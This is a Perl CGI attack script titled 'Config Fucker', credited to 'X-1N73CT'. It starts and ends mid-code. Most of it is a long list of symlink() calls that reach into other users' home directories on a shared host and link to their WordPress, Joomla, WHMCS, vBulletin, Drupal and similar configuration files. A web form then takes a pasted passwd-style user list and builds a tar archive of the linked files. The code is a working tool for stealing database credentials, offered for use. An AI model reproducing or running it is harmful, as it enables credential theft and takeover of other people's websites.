 symlink('/home4/'.$user.'/public_html/protal/configuration.php',$domain.'~~>joomla-protal.txt');
 symlink('/home4/'.$user.'/public_html/joo/configuration.php',$domain.'~~>joomla-joo.txt');
 symlink('/home4/'.$user.'/public_html/cms/configuration.php',$domain.'~~>joomla-cms.txt');
 symlink('/home4/'.$user.'/public_html/site/configuration.php',$domain.'~~>joomla-site.txt');
 symlink('/home4/'.$user.'/public_html/main/configuration.php',$domain.'~~>joomla-main.txt');
 symlink('/home4/'.$user.'/public_html/news/configuration.php',$domain.'~~>joomla-news.txt');
 symlink('/home4/'.$user.'/public_html/new/configuration.php',$domain.'~~>joomla-new.txt');
 symlink('/home4/'.$user.'/public_html/home/configuration.php',$domain.'~~>joomla-home.txt');
 symlink('/home4/'.$user.'/public_html/forum/includes/config.php',$domain.'~~>VBulletin-forum.txt');
 symlink('/home4/'.$user.'/public_html/vb/includes/config.php',$domain.'~~>vb.txt');
 symlink('/home4/'.$user.'/public_html/vb3/includes/config.php',$domain.'~~>vb3.txt');
 symlink('/home4/'.$user.'/public_html/cpanel/configuration.php',$domain.'~~>cpanel.txt');
 symlink('/home4/'.$user.'/public_html/panel/configuration.php',$domain.'~~>panel.txt');
 symlink('/home4/'.$user.'/public_html/host/configuration.php',$domain.'~~>host.txt');
 symlink('/home4/'.$user.'/public_html/hosting/configuration.php',$domain.'~~>hosting.txt');
 symlink('/home4/'.$user.'/public_html/hosts/configuration.php',$domain.'~~>hosts.txt');
 symlink('/home4/'.$user.'/public_html/includes/dist-configure.php',$domain.'~~>zencart.txt'); 
 symlink('/home4/'.$user.'/public_html/zencart/includes/dist-configure.php',$domain.'~~>zencart-shop.txt'); 
 symlink('/home4/'.$user.'/public_html/shop/includes/dist-configure.php',$domain.'~~>hop-ZCshop.txt'); 
 symlink('/home4/'.$user.'/public_html/mk_conf.php',$pdomain.'~~>mk-portale1.txt');
 symlink('/home4/'.$user.'/public_html/Settings.php',$domain.'~~>smf.txt'); 
 symlink('/home4/'.$user.'/public_html/smf/Settings.php',$domain.'~~>smf-smf.txt'); 
 symlink('/home4/'.$user.'/public_html/forum/Settings.php',$domain.'~~>smf-forum.txt'); 
 symlink('/home4/'.$user.'/public_html/forums/Settings.php',$domain.'~~>smf-forums.txt'); 
 symlink('/home4/'.$user.'/public_html/upload/includes/config.php',$domain.'~~>upload.txt');
 symlink('/home4/'.$user.'/public_html/incl/config.php',$domain.'~~>malay.txt');
 symlink('/home4/'.$user.'/public_html/clientes/configuration.php',$domain.'~~>clents.txt');
 symlink('/home4/'.$user.'/public_html/cliente/configuration.php',$domain.'~~>client2.txt');
 symlink('/home4/'.$user.'/public_html/clientsupport/configuration.php',$domain.'~~>client.txt');
 symlink('/home4/'.$user.'/public_html/config/koneksi.php',$domain.'~~>lokomedia.txt');
 symlink('/home4/'.$user.'/public_html/admin/config.php',$domain.'~~>webconfig.txt');
 symlink('/home4/'.$user.'/public_html/admin/conf.php',$domain.'~~>webconfig2.txt');
 symlink('/home4/'.$user.'/public_html/system/sistem.php',$domain.'~~>lokomedia1.txt'); 
 symlink('/home4/'.$user.'/system/sistem.php',$domain.'~~>lokomedia.txt');
 symlink('/home4/'.$user.'/public_html/sites/default/settings.php',$domain.'~>Drupal.txt');
 symlink('/home4/'.$user.'/public_html/e107_config.php',$domain.'~>e107.txt');
 symlink('/home4/'.$user.'/public_html/datas/config.php',$domain.'~>Seditio.txt'); 
 symlink('/home5/'.$user.'/public_html/SSI.php',$domain.'~~>CMF.txt') ; 
 symlink('/home5/'.$user.'/public_html/forum/SSI.php',$domain.'~~>CMF-forum.txt') ; 
 symlink('/home5/'.$user.'/public_html/inc/config.php',$domain.'~~>MyBB.txt') ;
 symlink('/home5/'.$user.'/public_html/forum/inc/config.php',$domain.'~~>MyBB-forum.txt') ;
 symlink('/home5/'.$user.'/public_html/config.php',$domain.'~~>Other.txt') ;
 symlink('/home5/'.$user.'/public_html/conf_global.php',$domain.'~~>invisio.txt');
 symlink('/home5/'.$user.'/public_html/lib/config.php',$domain.'~~>Balitbang.txt') ;
 symlink('/home5/'.$user.'/public_html/client/configuration.php',$domain.'~~>clients.txt') ; 
 symlink('/home5/'.$user.'/public_html/clients/configuration.php',$domain.'~~>client.txt') ; 
 symlink('/home5/'.$user.'/public_html/billing/configuration.php',$domain.'~~>billing.txt') ; 
 symlink('/home5/'.$user.'/public_html/billings/configuration.php',$domain.'~~>billings.txt') ;
 symlink('/home5/'.$user.'/public_html/forum/config.php',$domain.'~~>PhpBB-forum.txt') ;
 symlink('/home5/'.$user.'/public_html/includes/functions.php',$domain.'~~>phpbb3.txt');
 symlink('/home5/'.$user.'/public_html/whmcs/configuration.php',$domain.'~~>whmcs.txt') ; 
 symlink('/home5/'.$user.'/public_html/whm/configuration.php',$domain.'~~>whm.txt');
 symlink('/home5/'.$user.'/public_html/whmc/configuration.php',$domain.'~~>whmc.txt');
 symlink('/home5/'.$user.'/public_html/submitticket.php',$domain.'~~>whmcs2.txt');
 symlink('/home5/'.$user.'/public_html/manage/configuration.php',$domain.'~~>mangewhmcs.txt'); 
 symlink('/home5/'.$user.'/public_html/order/configuration.php',$domain.'~~>Whm9.txt');
 symlink('/home5/'.$user.'/public_html/myshop/configuration.php',$domain.'~~>myshop.txt'); 
 symlink('/home5/'.$user.'/public_html/support/configuration.php',$domain.'~~>support.txt');
 symlink('/home5/'.$user.'/public_html/supports/configuration.php',$domain.'~~>supports.txt');
 symlink('/home5/'.$user.'/public_html/oscommerce/includes/configure.php',$domain.'~~>oscommerce.txt');
 symlink('/home5/'.$user.'/public_html/oscommerces/includes/configure.php',$domain.'~~>oscommerces.txt');
 symlink('/home5/'.$user.'/public_html/shopping/includes/configure.php',$domain.'~~>shop-shopping.txt');
 symlink('/home5/'.$user.'/public_html/sale/includes/configure.php',$domain.'~~>sale.txt');
 symlink('/home5/'.$user.'/public_html/amember/config.inc.php',$domain.'~~>amember.txt');
 symlink('/home5/'.$user.'/public_html/config.inc.php',$domain.'~~>amember2.txt');
 symlink('/home5/'.$user.'/public_html/wp-config.php',$domain.'~~>wordpress.txt') ; 
 symlink('/home5/'.$user.'/public_html/wp/wp-config.php',$domain.'~~>wordpress-wp.txt');
 symlink('/home5/'.$user.'/public_html/wp/beta/wp-config.php',$domain.'~~>wordpress-wp-beta.txt');
 symlink('/home5/'.$user.'/public_html/beta/wp-config.php',$domain.'~~>wordpress-beta.txt');
 symlink('/home5/'.$user.'/public_html/press/wp-config.php',$domain.'~~>wp13-press.txt');
 symlink('/home5/'.$user.'/public_html/wordpress/wp-config.php',$domain.'~~>wordpress-wordpress.txt');
 symlink('/home5/'.$user.'/public_html/wordpress/beta/wp-config.php',$domain.'~~>wordpress-wordpress-beta.txt');
 symlink('/home5/'.$user.'/public_html/news/wp-config.php',$domain.'~~>wordpress-news.txt');
 symlink('/home5/'.$user.'/public_html/new/wp-config.php',$domain.'~~>wordpress-new.txt');
 symlink('/home5/'.$user.'/public_html/blog/wp-config.php',$domain.'~~>wordpress.txt') ; 
 symlink('/home5/'.$user.'/public_html/web/wp-config.php',$domain.'~~>wordpress-web.txt') ; 
 symlink('/home5/'.$user.'/public_html/blogs/wp-config.php',$domain.'~~>wordpress-blogs.txt');
 symlink('/home5/'.$user.'/public_html/home/wp-config.php',$domain.'~~>wordpress-home.txt');
 symlink('/home5/'.$user.'/public_html/protal/wp-config.php',$domain.'~~>wordpress-protal.txt');
 symlink('/home5/'.$user.'/public_html/site/wp-config.php',$domain.'~~>ordpress-site.txt');
 symlink('/home5/'.$user.'/public_html/main/wp-config.php',$domain.'~~>wordpress-main.txt');
 symlink('/home5/'.$user.'/public_html/test/wp-config.php',$domain.'~~>wordpress-test.txt');
 symlink('/home5/'.$user.'/public_html/beta/configuration.php',$domain.'~~>joomla.txt') ; 
 symlink('/home5/'.$user.'/public_html/configuration.php',$domain.'~~>joomla.txt') ; 
 symlink('/home5/'.$user.'/public_html/home/configuration.php',$domain.'~~>joomla-home.txt') ;
 symlink('/home5/'.$user.'/public_html/joomla/configuration.php',$domain.'~~>joomla-joomla.txt');
 symlink('/home5/'.$user.'/public_html/protal/configuration.php',$domain.'~~>joomla-protal.txt');
 symlink('/home5/'.$user.'/public_html/joo/configuration.php',$domain.'~~>joomla-joo.txt');
 symlink('/home5/'.$user.'/public_html/cms/configuration.php',$domain.'~~>joomla-cms.txt');
 symlink('/home5/'.$user.'/public_html/site/configuration.php',$domain.'~~>joomla-site.txt');
 symlink('/home5/'.$user.'/public_html/main/configuration.php',$domain.'~~>joomla-main.txt');
 symlink('/home5/'.$user.'/public_html/news/configuration.php',$domain.'~~>joomla-news.txt');
 symlink('/home5/'.$user.'/public_html/new/configuration.php',$domain.'~~>joomla-new.txt');
 symlink('/home5/'.$user.'/public_html/home/configuration.php',$domain.'~~>joomla-home.txt');
 symlink('/home5/'.$user.'/public_html/forum/includes/config.php',$domain.'~~>VBulletin-forum.txt');
 symlink('/home5/'.$user.'/public_html/vb/includes/config.php',$domain.'~~>vb.txt');
 symlink('/home5/'.$user.'/public_html/vb3/includes/config.php',$domain.'~~>vb3.txt');
 symlink('/home5/'.$user.'/public_html/cpanel/configuration.php',$domain.'~~>cpanel.txt');
 symlink('/home5/'.$user.'/public_html/panel/configuration.php',$domain.'~~>panel.txt');
 symlink('/home5/'.$user.'/public_html/host/configuration.php',$domain.'~~>host.txt');
 symlink('/home5/'.$user.'/public_html/hosting/configuration.php',$domain.'~~>hosting.txt');
 symlink('/home5/'.$user.'/public_html/hosts/configuration.php',$domain.'~~>hosts.txt');
 symlink('/home5/'.$user.'/public_html/includes/dist-configure.php',$domain.'~~>zencart.txt'); 
 symlink('/home5/'.$user.'/public_html/zencart/includes/dist-configure.php',$domain.'~~>zencart-shop.txt'); 
 symlink('/home5/'.$user.'/public_html/shop/includes/dist-configure.php',$domain.'~~>hop-ZCshop.txt'); 
 symlink('/home5/'.$user.'/public_html/mk_conf.php',$pdomain.'~~>mk-portale1.txt');
 symlink('/home5/'.$user.'/public_html/Settings.php',$domain.'~~>smf.txt'); 
 symlink('/home5/'.$user.'/public_html/smf/Settings.php',$domain.'~~>smf-smf.txt'); 
 symlink('/home5/'.$user.'/public_html/forum/Settings.php',$domain.'~~>smf-forum.txt'); 
 symlink('/home5/'.$user.'/public_html/forums/Settings.php',$domain.'~~>smf-forums.txt'); 
 symlink('/home5/'.$user.'/public_html/upload/includes/config.php',$domain.'~~>upload.txt');
 symlink('/home5/'.$user.'/public_html/incl/config.php',$domain.'~~>malay.txt');
 symlink('/home5/'.$user.'/public_html/clientes/configuration.php',$domain.'~~>clents.txt');
 symlink('/home5/'.$user.'/public_html/cliente/configuration.php',$domain.'~~>client2.txt');
 symlink('/home5/'.$user.'/public_html/clientsupport/configuration.php',$domain.'~~>client.txt');
 symlink('/home5/'.$user.'/public_html/config/koneksi.php',$domain.'~~>lokomedia.txt');
 symlink('/home5/'.$user.'/public_html/admin/config.php',$domain.'~~>webconfig.txt');
 symlink('/home5/'.$user.'/public_html/admin/conf.php',$domain.'~~>webconfig2.txt');
 symlink('/home5/'.$user.'/public_html/system/sistem.php',$domain.'~~>lokomedia1.txt'); 
 symlink('/home5/'.$user.'/system/sistem.php',$domain.'~~>lokomedia.txt'); 
 symlink('/home5/'.$user.'/public_html/sites/default/settings.php',$domain.'~>Drupal.txt');
 symlink('/home5/'.$user.'/public_html/e107_config.php',$domain.'~>e107.txt');
 symlink('/home5/'.$user.'/public_html/datas/config.php',$domain.'~>Seditio.txt');
 symlink('/home6/'.$user.'/public_html/SSI.php',$domain.'~~>CMF.txt') ; 
 symlink('/home6/'.$user.'/public_html/forum/SSI.php',$domain.'~~>CMF-forum.txt') ; 
 symlink('/home6/'.$user.'/public_html/inc/config.php',$domain.'~~>MyBB.txt') ;
 symlink('/home6/'.$user.'/public_html/forum/inc/config.php',$domain.'~~>MyBB-forum.txt') ;
 symlink('/home6/'.$user.'/public_html/config.php',$domain.'~~>Other.txt') ;
 symlink('/home6/'.$user.'/public_html/conf_global.php',$domain.'~~>invisio.txt');
 symlink('/home6/'.$user.'/public_html/lib/config.php',$domain.'~~>Balitbang.txt') ;
 symlink('/home6/'.$user.'/public_html/client/configuration.php',$domain.'~~>clients.txt') ; 
 symlink('/home6/'.$user.'/public_html/clients/configuration.php',$domain.'~~>client.txt') ; 
 symlink('/home6/'.$user.'/public_html/billing/configuration.php',$domain.'~~>billing.txt') ; 
 symlink('/home6/'.$user.'/public_html/billings/configuration.php',$domain.'~~>billings.txt') ;
 symlink('/home6/'.$user.'/public_html/forum/config.php',$domain.'~~>PhpBB-forum.txt') ;
 symlink('/home6/'.$user.'/public_html/includes/functions.php',$domain.'~~>phpbb3.txt');
 symlink('/home6/'.$user.'/public_html/whmcs/configuration.php',$domain.'~~>whmcs.txt') ; 
 symlink('/home6/'.$user.'/public_html/whm/configuration.php',$domain.'~~>whm.txt');
 symlink('/home6/'.$user.'/public_html/whmc/configuration.php',$domain.'~~>whmc.txt');
 symlink('/home6/'.$user.'/public_html/submitticket.php',$domain.'~~>whmcs2.txt');
 symlink('/home6/'.$user.'/public_html/manage/configuration.php',$domain.'~~>mangewhmcs.txt'); 
 symlink('/home6/'.$user.'/public_html/order/configuration.php',$domain.'~~>Whm9.txt');
 symlink('/home6/'.$user.'/public_html/myshop/configuration.php',$domain.'~~>myshop.txt'); 
 symlink('/home6/'.$user.'/public_html/support/configuration.php',$domain.'~~>support.txt');
 symlink('/home6/'.$user.'/public_html/supports/configuration.php',$domain.'~~>supports.txt');
 symlink('/home6/'.$user.'/public_html/oscommerce/includes/configure.php',$domain.'~~>oscommerce.txt');
 symlink('/home6/'.$user.'/public_html/oscommerces/includes/configure.php',$domain.'~~>oscommerces.txt');
 symlink('/home6/'.$user.'/public_html/shopping/includes/configure.php',$domain.'~~>shop-shopping.txt');
 symlink('/home6/'.$user.'/public_html/sale/includes/configure.php',$domain.'~~>sale.txt');
 symlink('/home6/'.$user.'/public_html/amember/config.inc.php',$domain.'~~>amember.txt');
 symlink('/home6/'.$user.'/public_html/config.inc.php',$domain.'~~>amember2.txt');
 symlink('/home6/'.$user.'/public_html/wp-config.php',$domain.'~~>wordpress.txt') ; 
 symlink('/home6/'.$user.'/public_html/wp/wp-config.php',$domain.'~~>wordpress-wp.txt');
 symlink('/home6/'.$user.'/public_html/wp/beta/wp-config.php',$domain.'~~>wordpress-wp-beta.txt');
 symlink('/home6/'.$user.'/public_html/beta/wp-config.php',$domain.'~~>wordpress-beta.txt');
 symlink('/home6/'.$user.'/public_html/press/wp-config.php',$domain.'~~>wp13-press.txt');
 symlink('/home6/'.$user.'/public_html/wordpress/wp-config.php',$domain.'~~>wordpress-wordpress.txt');
 symlink('/home6/'.$user.'/public_html/wordpress/beta/wp-config.php',$domain.'~~>wordpress-wordpress-beta.txt');
 symlink('/home6/'.$user.'/public_html/news/wp-config.php',$domain.'~~>wordpress-news.txt');
 symlink('/home6/'.$user.'/public_html/new/wp-config.php',$domain.'~~>wordpress-new.txt');
 symlink('/home6/'.$user.'/public_html/blog/wp-config.php',$domain.'~~>wordpress.txt') ; 
 symlink('/home6/'.$user.'/public_html/web/wp-config.php',$domain.'~~>wordpress-web.txt') ; 
 symlink('/home6/'.$user.'/public_html/blogs/wp-config.php',$domain.'~~>wordpress-blogs.txt');
 symlink('/home6/'.$user.'/public_html/home/wp-config.php',$domain.'~~>wordpress-home.txt');
 symlink('/home6/'.$user.'/public_html/protal/wp-config.php',$domain.'~~>wordpress-protal.txt');
 symlink('/home6/'.$user.'/public_html/site/wp-config.php',$domain.'~~>ordpress-site.txt');
 symlink('/home6/'.$user.'/public_html/main/wp-config.php',$domain.'~~>wordpress-main.txt');
 symlink('/home6/'.$user.'/public_html/test/wp-config.php',$domain.'~~>wordpress-test.txt');
 symlink('/home6/'.$user.'/public_html/beta/configuration.php',$domain.'~~>joomla.txt') ; 
 symlink('/home6/'.$user.'/public_html/configuration.php',$domain.'~~>joomla.txt') ; 
 symlink('/home6/'.$user.'/public_html/home/configuration.php',$domain.'~~>joomla-home.txt') ;
 symlink('/home6/'.$user.'/public_html/joomla/configuration.php',$domain.'~~>joomla-joomla.txt');
 symlink('/home6/'.$user.'/public_html/protal/configuration.php',$domain.'~~>joomla-protal.txt');
 symlink('/home6/'.$user.'/public_html/joo/configuration.php',$domain.'~~>joomla-joo.txt');
 symlink('/home6/'.$user.'/public_html/cms/configuration.php',$domain.'~~>joomla-cms.txt');
 symlink('/home6/'.$user.'/public_html/site/configuration.php',$domain.'~~>joomla-site.txt');
 symlink('/home6/'.$user.'/public_html/main/configuration.php',$domain.'~~>joomla-main.txt');
 symlink('/home6/'.$user.'/public_html/news/configuration.php',$domain.'~~>joomla-news.txt');
 symlink('/home6/'.$user.'/public_html/new/configuration.php',$domain.'~~>joomla-new.txt');
 symlink('/home6/'.$user.'/public_html/home/configuration.php',$domain.'~~>joomla-home.txt');
 symlink('/home6/'.$user.'/public_html/forum/includes/config.php',$domain.'~~>VBulletin-forum.txt');
 symlink('/home6/'.$user.'/public_html/vb/includes/config.php',$domain.'~~>vb.txt');
 symlink('/home6/'.$user.'/public_html/vb3/includes/config.php',$domain.'~~>vb3.txt');
 symlink('/home6/'.$user.'/public_html/cpanel/configuration.php',$domain.'~~>cpanel.txt');
 symlink('/home6/'.$user.'/public_html/panel/configuration.php',$domain.'~~>panel.txt');
 symlink('/home6/'.$user.'/public_html/host/configuration.php',$domain.'~~>host.txt');
 symlink('/home6/'.$user.'/public_html/hosting/configuration.php',$domain.'~~>hosting.txt');
 symlink('/home6/'.$user.'/public_html/hosts/configuration.php',$domain.'~~>hosts.txt');
 symlink('/home6/'.$user.'/public_html/includes/dist-configure.php',$domain.'~~>zencart.txt'); 
 symlink('/home6/'.$user.'/public_html/zencart/includes/dist-configure.php',$domain.'~~>zencart-shop.txt'); 
 symlink('/home6/'.$user.'/public_html/shop/includes/dist-configure.php',$domain.'~~>hop-ZCshop.txt'); 
 symlink('/home6/'.$user.'/public_html/mk_conf.php',$pdomain.'~~>mk-portale1.txt');
 symlink('/home6/'.$user.'/public_html/Settings.php',$domain.'~~>smf.txt'); 
 symlink('/home6/'.$user.'/public_html/smf/Settings.php',$domain.'~~>smf-smf.txt'); 
 symlink('/home6/'.$user.'/public_html/forum/Settings.php',$domain.'~~>smf-forum.txt'); 
 symlink('/home6/'.$user.'/public_html/forums/Settings.php',$domain.'~~>smf-forums.txt'); 
 symlink('/home6/'.$user.'/public_html/upload/includes/config.php',$domain.'~~>upload.txt');
 symlink('/home6/'.$user.'/public_html/incl/config.php',$domain.'~~>malay.txt');
 symlink('/home6/'.$user.'/public_html/clientes/configuration.php',$domain.'~~>clents.txt');
 symlink('/home6/'.$user.'/public_html/cliente/configuration.php',$domain.'~~>client2.txt');
 symlink('/home6/'.$user.'/public_html/clientsupport/configuration.php',$domain.'~~>client.txt');
 symlink('/home6/'.$user.'/public_html/config/koneksi.php',$domain.'~~>lokomedia.txt');
 symlink('/home6/'.$user.'/public_html/admin/config.php',$domain.'~~>webconfig.txt');
 symlink('/home6/'.$user.'/public_html/admin/conf.php',$domain.'~~>webconfig2.txt');
 symlink('/home6/'.$user.'/public_html/system/sistem.php',$domain.'~~>lokomedia1.txt'); 
 symlink('/home6/'.$user.'/system/sistem.php',$domain.'~~>lokomedia.txt');
 symlink('/home6/'.$user.'/public_html/sites/default/settings.php',$domain.'~>Drupal.txt');
 symlink('/home6/'.$user.'/public_html/e107_config.php',$domain.'~>e107.txt');
 symlink('/home6/'.$user.'/public_html/datas/config.php',$domain.'~>Seditio.txt'); 
 symlink('/home7/'.$user.'/public_html/SSI.php',$domain.'~~>CMF.txt') ; 
 symlink('/home7/'.$user.'/public_html/forum/SSI.php',$domain.'~~>CMF-forum.txt') ; 
 symlink('/home7/'.$user.'/public_html/inc/config.php',$domain.'~~>MyBB.txt') ;
 symlink('/home7/'.$user.'/public_html/forum/inc/config.php',$domain.'~~>MyBB-forum.txt') ;
 symlink('/home7/'.$user.'/public_html/config.php',$domain.'~~>Other.txt') ;
 symlink('/home7/'.$user.'/public_html/conf_global.php',$domain.'~~>invisio.txt');
 symlink('/home7/'.$user.'/public_html/lib/config.php',$domain.'~~>Balitbang.txt') ;
 symlink('/home7/'.$user.'/public_html/client/configuration.php',$domain.'~~>clients.txt') ; 
 symlink('/home7/'.$user.'/public_html/clients/configuration.php',$domain.'~~>client.txt') ; 
 symlink('/home7/'.$user.'/public_html/billing/configuration.php',$domain.'~~>billing.txt') ; 
 symlink('/home7/'.$user.'/public_html/billings/configuration.php',$domain.'~~>billings.txt') ;
 symlink('/home7/'.$user.'/public_html/forum/config.php',$domain.'~~>PhpBB-forum.txt') ;
 symlink('/home7/'.$user.'/public_html/includes/functions.php',$domain.'~~>phpbb3.txt');
 symlink('/home7/'.$user.'/public_html/whmcs/configuration.php',$domain.'~~>whmcs.txt') ; 
 symlink('/home7/'.$user.'/public_html/whm/configuration.php',$domain.'~~>whm.txt');
 symlink('/home7/'.$user.'/public_html/whmc/configuration.php',$domain.'~~>whmc.txt');
 symlink('/home7/'.$user.'/public_html/submitticket.php',$domain.'~~>whmcs2.txt');
 symlink('/home7/'.$user.'/public_html/manage/configuration.php',$domain.'~~>mangewhmcs.txt'); 
 symlink('/home7/'.$user.'/public_html/order/configuration.php',$domain.'~~>Whm9.txt');
 symlink('/home7/'.$user.'/public_html/myshop/configuration.php',$domain.'~~>myshop.txt'); 
 symlink('/home7/'.$user.'/public_html/support/configuration.php',$domain.'~~>support.txt');
 symlink('/home7/'.$user.'/public_html/supports/configuration.php',$domain.'~~>supports.txt');
 symlink('/home7/'.$user.'/public_html/oscommerce/includes/configure.php',$domain.'~~>oscommerce.txt');
 symlink('/home7/'.$user.'/public_html/oscommerces/includes/configure.php',$domain.'~~>oscommerces.txt');
 symlink('/home7/'.$user.'/public_html/shopping/includes/configure.php',$domain.'~~>shop-shopping.txt');
 symlink('/home7/'.$user.'/public_html/sale/includes/configure.php',$domain.'~~>sale.txt');
 symlink('/home7/'.$user.'/public_html/amember/config.inc.php',$domain.'~~>amember.txt');
 symlink('/home7/'.$user.'/public_html/config.inc.php',$domain.'~~>amember2.txt');
 symlink('/home7/'.$user.'/public_html/wp-config.php',$domain.'~~>wordpress.txt') ; 
 symlink('/home7/'.$user.'/public_html/wp/wp-config.php',$domain.'~~>wordpress-wp.txt');
 symlink('/home7/'.$user.'/public_html/wp/beta/wp-config.php',$domain.'~~>wordpress-wp-beta.txt');
 symlink('/home7/'.$user.'/public_html/beta/wp-config.php',$domain.'~~>wordpress-beta.txt');
 symlink('/home7/'.$user.'/public_html/press/wp-config.php',$domain.'~~>wp13-press.txt');
 symlink('/home7/'.$user.'/public_html/wordpress/wp-config.php',$domain.'~~>wordpress-wordpress.txt');
 symlink('/home7/'.$user.'/public_html/wordpress/beta/wp-config.php',$domain.'~~>wordpress-wordpress-beta.txt');
 symlink('/home7/'.$user.'/public_html/news/wp-config.php',$domain.'~~>wordpress-news.txt');
 symlink('/home7/'.$user.'/public_html/new/wp-config.php',$domain.'~~>wordpress-new.txt');
 symlink('/home7/'.$user.'/public_html/blog/wp-config.php',$domain.'~~>wordpress.txt') ; 
 symlink('/home7/'.$user.'/public_html/web/wp-config.php',$domain.'~~>wordpress-web.txt') ; 
 symlink('/home7/'.$user.'/public_html/blogs/wp-config.php',$domain.'~~>wordpress-blogs.txt');
 symlink('/home7/'.$user.'/public_html/home/wp-config.php',$domain.'~~>wordpress-home.txt');
 symlink('/home7/'.$user.'/public_html/protal/wp-config.php',$domain.'~~>wordpress-protal.txt');
 symlink('/home7/'.$user.'/public_html/site/wp-config.php',$domain.'~~>ordpress-site.txt');
 symlink('/home7/'.$user.'/public_html/main/wp-config.php',$domain.'~~>wordpress-main.txt');
 symlink('/home7/'.$user.'/public_html/test/wp-config.php',$domain.'~~>wordpress-test.txt');
 symlink('/home7/'.$user.'/public_html/beta/configuration.php',$domain.'~~>joomla.txt') ; 
 symlink('/home7/'.$user.'/public_html/configuration.php',$domain.'~~>joomla.txt') ; 
 symlink('/home7/'.$user.'/public_html/home/configuration.php',$domain.'~~>joomla-home.txt') ;
 symlink('/home7/'.$user.'/public_html/joomla/configuration.php',$domain.'~~>joomla-joomla.txt');
 symlink('/home7/'.$user.'/public_html/protal/configuration.php',$domain.'~~>joomla-protal.txt');
 symlink('/home7/'.$user.'/public_html/joo/configuration.php',$domain.'~~>joomla-joo.txt');
 symlink('/home7/'.$user.'/public_html/cms/configuration.php',$domain.'~~>joomla-cms.txt');
 symlink('/home7/'.$user.'/public_html/site/configuration.php',$domain.'~~>joomla-site.txt');
 symlink('/home7/'.$user.'/public_html/main/configuration.php',$domain.'~~>joomla-main.txt');
 symlink('/home7/'.$user.'/public_html/news/configuration.php',$domain.'~~>joomla-news.txt');
 symlink('/home7/'.$user.'/public_html/new/configuration.php',$domain.'~~>joomla-new.txt');
 symlink('/home7/'.$user.'/public_html/home/configuration.php',$domain.'~~>joomla-home.txt');
 symlink('/home7/'.$user.'/public_html/forum/includes/config.php',$domain.'~~>VBulletin-forum.txt');
 symlink('/home7/'.$user.'/public_html/vb/includes/config.php',$domain.'~~>vb.txt');
 symlink('/home7/'.$user.'/public_html/vb3/includes/config.php',$domain.'~~>vb3.txt');
 symlink('/home7/'.$user.'/public_html/cpanel/configuration.php',$domain.'~~>cpanel.txt');
 symlink('/home7/'.$user.'/public_html/panel/configuration.php',$domain.'~~>panel.txt');
 symlink('/home7/'.$user.'/public_html/host/configuration.php',$domain.'~~>host.txt');
 symlink('/home7/'.$user.'/public_html/hosting/configuration.php',$domain.'~~>hosting.txt');
 symlink('/home7/'.$user.'/public_html/hosts/configuration.php',$domain.'~~>hosts.txt');
 symlink('/home7/'.$user.'/public_html/includes/dist-configure.php',$domain.'~~>zencart.txt'); 
 symlink('/home7/'.$user.'/public_html/zencart/includes/dist-configure.php',$domain.'~~>zencart-shop.txt'); 
 symlink('/home7/'.$user.'/public_html/shop/includes/dist-configure.php',$domain.'~~>hop-ZCshop.txt'); 
 symlink('/home7/'.$user.'/public_html/mk_conf.php',$pdomain.'~~>mk-portale1.txt');
 symlink('/home7/'.$user.'/public_html/Settings.php',$domain.'~~>smf.txt'); 
 symlink('/home7/'.$user.'/public_html/smf/Settings.php',$domain.'~~>smf-smf.txt'); 
 symlink('/home7/'.$user.'/public_html/forum/Settings.php',$domain.'~~>smf-forum.txt'); 
 symlink('/home7/'.$user.'/public_html/forums/Settings.php',$domain.'~~>smf-forums.txt'); 
 symlink('/home7/'.$user.'/public_html/upload/includes/config.php',$domain.'~~>upload.txt');
 symlink('/home7/'.$user.'/public_html/incl/config.php',$domain.'~~>malay.txt');
 symlink('/home7/'.$user.'/public_html/clientes/configuration.php',$domain.'~~>clents.txt');
 symlink('/home7/'.$user.'/public_html/cliente/configuration.php',$domain.'~~>client2.txt');
 symlink('/home7/'.$user.'/public_html/clientsupport/configuration.php',$domain.'~~>client.txt');
 symlink('/home7/'.$user.'/public_html/config/koneksi.php',$domain.'~~>lokomedia.txt');
 symlink('/home7/'.$user.'/public_html/admin/config.php',$domain.'~~>webconfig.txt');
 symlink('/home7/'.$user.'/public_html/admin/conf.php',$domain.'~~>webconfig2.txt');
 symlink('/home7/'.$user.'/public_html/system/sistem.php',$domain.'~~>lokomedia1.txt'); 
 symlink('/home7/'.$user.'/system/sistem.php',$domain.'~~>lokomedia.txt');
 symlink('/home7/'.$user.'/public_html/sites/default/settings.php',$domain.'~>Drupal.txt');
 symlink('/home7/'.$user.'/public_html/e107_config.php',$domain.'~>e107.txt');
 symlink('/home7/'.$user.'/public_html/datas/config.php',$domain.'~>Seditio.txt'); 
}
if ($ENV{'REQUEST_METHOD'} eq 'POST') {
  read(STDIN, $buffer, $ENV{'CONTENT_LENGTH'});
} else {
  $buffer = $ENV{'QUERY_STRING'};
}
@pairs = split(/&/, $buffer);
foreach $pair (@pairs) {
  ($name, $value) = split(/=/, $pair);
  $name =~ tr/+/ /;
  $name =~ s/%([a-fA-F0-9][a-fA-F0-9])/pack("C", hex($1))/eg;
  $value =~ tr/+/ /;
  $value =~ s/%([a-fA-F0-9][a-fA-F0-9])/pack("C", hex($1))/eg;
  $FORM{$name} = $value;
}
if ($FORM{pass} eq ""){
print '
<body class="newStyle1" bgcolor="#000000">
<p>Config Fucker</p>
<p><font color="#C0C0C0">[</font> Coded By <font color="#FF0000">X-1N73CT</font><font color="#C0C0C0">]</font>
<form method="post">
<textarea name="pass" style="border:1px dotted #00ff00; width: 543px; height: 420px; background-color:#0C0C0C; font-family:Tahoma; font-size:8pt; color:#FF0000"  ></textarea></p>
<p align="center">
<input name="tar" type="text" style="border:1px dotted #FF0000; width: 212px; background-color:#0C0C0C; font-family:Tahoma; font-size:8pt; color:#FF0000; "  /></p>
<p align="center">
<input name="Submit1" type="submit" value="GET CONFIG !" style="border:1px dotted #FF0000; width: 99; font-family:Tahoma; font-size:10pt; color:#59E817; text-transform:uppercase; height:23; background-color:#0C0C0C" /></p>
</form>';
}else{
@lines =<$FORM{pass}>;
$y = @lines;
open (MYFILE, ">tar.tmp");
print MYFILE "tar -czf ".$FORM{tar}.".tar ";
for ($ka=0;$ka<$y;$ka++){
while(@lines[$ka]  =~ m/(.*?):x:/g){
&lil($1);
print MYFILE $1.".txt ";
for($kd=1;$kd<18;$kd++){
print MYFILE $1.$kd.".txt ";
}
}
 }
print'<body class="newStyle1" bgcolor="#000000">
<p>You got it!!<br><br><br><font color="#C0C0C0">[</font> Coded By <font color="#FF0000">X-1N73CT</font><font color="#C0C0C0">]</font></p>
<p>&nbsp;</p>';
if($FORM{tar} ne ""){
open(INFO, "tar.tmp");
